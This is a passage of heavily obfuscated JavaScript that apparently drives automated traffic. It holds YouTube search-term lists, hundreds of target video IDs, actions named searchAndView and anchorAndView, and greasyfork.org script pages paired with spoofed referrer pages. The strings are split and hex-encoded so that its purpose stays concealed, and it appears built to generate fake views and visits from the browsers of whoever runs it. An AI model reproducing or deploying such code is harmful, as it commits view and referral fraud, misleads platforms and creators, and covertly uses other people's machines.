'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x182 * 0x15 + -0x1622 + -0x4bf * 0x2)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x13e6 + 0xdc4 + 0x62c)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x19ee + -0x35 * 0x5a + -0x749 * 0x1);

function a() {
  const bj = [
    'g0S3W77dUbtdLSoNWQrR',
    'sNzSugPsvwrjza',
    'W4pcGaBcJglcH8o9W5GFfG',
    'com/channe',
    'ywnbDK1huxrSBG',
    'W77cGa1WW6ddSmoCWPupoq',
    'zs1JBgfZC2LJ',
    'extra-plug',
    'QOv1N1X5J-',
    'prototype',
    'W7lcLSk/W6ngrfZcNmolW6y',
    'enuserjs.o',
    'B2DjyJDbn3r2vW',
    'AwXPDhKTBw9K',
    'ygNcKN0EbftcKCk4W5S',
    'ChrZlZqZmdu3mG',
    'close',
    '.0\x20Safari/',
    '-btb',
    'rg/en/scri'
  ];
  a = function() {
    return bj;
  };
  return a();
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    V(0x0, 'BcND') + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    W(0xc) + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    W(0x1) + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    V(0x5, 'N1hk') + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    U(0x8) + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    W(0x4) + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + U(0x12),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0xf) + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + W(0x6),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + U(0x13) + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
